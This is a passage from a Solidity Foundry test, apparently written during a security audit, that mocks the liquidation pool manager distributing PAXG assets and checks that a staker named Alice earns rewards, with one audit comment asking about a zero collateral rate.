        ///    Mocking LiquidationPoolManager approving the LiquidationPool       ///
        ///    to spend the assets                                                ///
        /////////////////////////////////////////////////////////////////////////////

        vm.startPrank(address(contracts.liquidationPoolManager));
        tokens.arbToken.approve(address(contracts.liquidationPool), rewardsBalance);
        tokens.paxgToken.approve(address(contracts.liquidationPool), rewardsBalance);
        vm.stopPrank();

        ////////////////////////////////////////////////////////
        //           setting up data for mock call           ///
        ////////////////////////////////////////////////////////

        ILiquidationPoolManager.Asset[1] memory _assets;

        // setting arb token data
        // _assets[0] = ILiquidationPoolManager.Asset(
        //     ITokenManager.Token({
        //         symbol: 'ARB',
        //         addr: address(tokens.arbToken),
        //         dec: 18,
        //         clAddr: address(priceFeeds.arbUsdPriceFeed),
        //         clDec: 8
        //     }),
        //     rewardsBalance
        // );

        _assets[0] = ILiquidationPoolManager.Asset(
            ITokenManager.Token({
                symbol: 'PAXG',
                addr: address(tokens.paxgToken),
                dec: 18,
                clAddr: address(priceFeeds.paxgUsdPriceFeed),
                clDec: 8
            }),
            rewardsBalance
        );

        assets.push(_assets[0]);
        // assets.push(_assets[1]);

        /////////////////////////////////////////////////////////////////////////////
        //      mocking distribute asset call from the liquidationPoolManager     ///
        /////////////////////////////////////////////////////////////////////////////

        console2.log("> Alice's ARB tokens Balance before Distributing Rewards: %s\n", tokens.arbToken.balanceOf(alice));

        vm.startPrank(address(contracts.liquidationPoolManager));
        // @audit what if collateral rate is set to zero
        contracts.liquidationPool.distributeAssets(assets, uint(constants.DEFAULT_COLLATERAL_RATE), 100_000);
        vm.stopPrank();

        ////////////////////////////////////////////////////////////////////
        //      getting the position of alice after the liquidation      ///
        //      There should be rewards in ARBs token. Also the EURO     ///
        //      balance of the Alice should be 0 as the amount should    ///
        //      have been spent to buy the liquidated assets.            ///
        ////////////////////////////////////////////////////////////////////

        (alicePosition, alicesRewards) = contracts.liquidationPool.position(alice);

        bool hasRewards;

        console2.log("> Alice's Rewards After liquidation: ");

        for (uint i; i < alicesRewards.length; i++) {
            if (alicesRewards[i].amount > 0) {
                console2.log('\tToken: %s', string(abi.encode(alicesRewards[i].symbol)));
                console2.log('\tReward Earned: %s\n', alicesRewards[i].amount);
                hasRewards = true;
            }
        }


        require(hasRewards, 'No rewards are earned by the staker');

        console2.log(alicePosition.EUROs);

    }


    function _createSmartVault(address _user) internal returns (address, uint) {
        vm.prank(_user);
        (address smartVault, uint tokenId) = contracts.smartVaultManagerV5.mint();
        vm.stopPrank();
        return (smartVault, tokenId);
    }
}


